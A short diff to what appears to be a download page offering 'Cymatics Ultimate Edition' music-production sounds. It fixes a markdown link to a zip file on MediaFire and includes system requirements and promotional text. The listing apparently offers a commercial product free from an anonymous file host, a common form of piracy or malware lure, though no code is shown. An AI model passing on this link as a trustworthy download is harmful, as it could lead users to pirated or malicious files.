@@ -6,6 +6,6 @@ OS - Windows 7 or higher (only x64-bit OS)
 RAM - 8 GB or more
 Disk space - 30 GB free space
 
-⚡️ [Download Cynematics Ultimate Edition](https://download1528.mediafire.com/mnlco0wz59vg/mrzyurzr8fvby38/CymaticsFm-UltimatePack.zip" id="downloadButton" rel="nofollow) ⚡️
+⚡️ [Download Cynematics Ultimate Edition](https://download1528.mediafire.com/mnlco0wz59vg/mrzyurzr8fvby38/CymaticsFm-UltimatePack.zip) ⚡️
 
  Want to fulfil your Dream of being a creative music producer, even without any experience? Cymatics Ultimate Edition lets you get started right away. Simply choose sounds from a massive collection of beats, tunes and vocals at chart quality level. Combine sounds and loops per drag & drop, play a whole library of software instruments and apply professional effects. It's time to your creative ideas to take centre stage. Simply create music..
